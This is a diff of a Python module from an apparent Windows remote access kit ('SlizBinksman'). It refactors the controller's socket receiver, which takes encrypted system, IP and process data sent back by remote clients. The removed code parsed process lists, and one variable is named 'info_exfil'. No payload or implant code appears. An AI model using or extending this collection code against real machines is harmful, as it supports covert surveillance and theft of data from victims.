@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.21
+# Build:  1.0.22
 # -------------------------------------------------------------
 import socket
 
@@ -70,41 +70,17 @@ class ReceiverSocket:
         string = self.get_data_from_client(encryption_key)  #Get string
         return string                                       #Return it
 
-    #Function will receive ping reply and log it to the gui console
-    def recv_ping_reply(self,encryption_key):
+    #Function will receive data from the client and write it to console
+    def recv_to_console(self, encryption_key):
         self.create_receiver_socket()                           #Create socket & listen for connection
         ping_reply = self.get_data_from_client(encryption_key)  #Accept the connection, process reply, close connection
         ConsoleWindow().log_to_console(ping_reply)              #Log the reply to the console window
 
-    #Function will receive sys/ip command out put from client and write to a file
-    def recv_sys_ip_info(self,encryption_key):
+    #Function will receive and log the data to a file
+    def recv_and_log_data(self, file_path,encryption_key):
         self.create_receiver_socket()                                   #Create receiver socket
         info_exfil = self.get_data_from_client(encryption_key)          #Get the data from the client and decrypt it
-        LoggingUtilitys().write_data_to_file(DSFilePath().sys_info_file,info_exfil) #Write the data to the data storage file
-
-    #Function will receive the list of running process's from the client, format and log it to the data storage directory
-    def recv_running_process(self,encryption_key):
-        self.create_receiver_socket()                               #Create receiver socket
-        process_list = self.get_data_from_client(encryption_key)    #Get process list from client
-        data_line_array = process_list.splitlines()                 #Split the lines of the process list
-        with open(DSFilePath().task_manager_file,'w') as task_file: #Open Data storage file
-            master_array = []                                       #Create master array
-            for line in data_line_array:                            #For each line in the array
-                if line != '':                                      #If the line is not an empty string
-                    array = []                                      #Create array local to loop iteration
-                    for data in line.split(' '):                    #For each piece of data split, to remove whitespace
-                        if data != '':                              #If the data is not an empty string, remove more invalid data
-                            array.append(data)                      #Append the data to the local array
-                    try:
-                        master_array.append(array[7])               #Append the process name
-                        master_array.append(array[5])               #Append the PID
-                        master_array.append(array[4])               #Append the CPU Usage
-                    except IndexError:                  #If there is a missing item from original command output on client, dial back the index by one. This is for proc's that don't have CPU output
-                        master_array.append(array[6])
-                        master_array.append(array[4])
-                        master_array.append(array[3])
-            task_file.write(str(master_array[6:]).strip('[').strip(']')+'\n') #When done with processing, write the data to the data storage file
-            task_file.close()
+        LoggingUtilitys().write_data_to_file(file_path,info_exfil) #Write the data to the data storage file
 
     #Function will receive the output from the taskkill command
     def recv_taskkill_output(self,encryption_key):
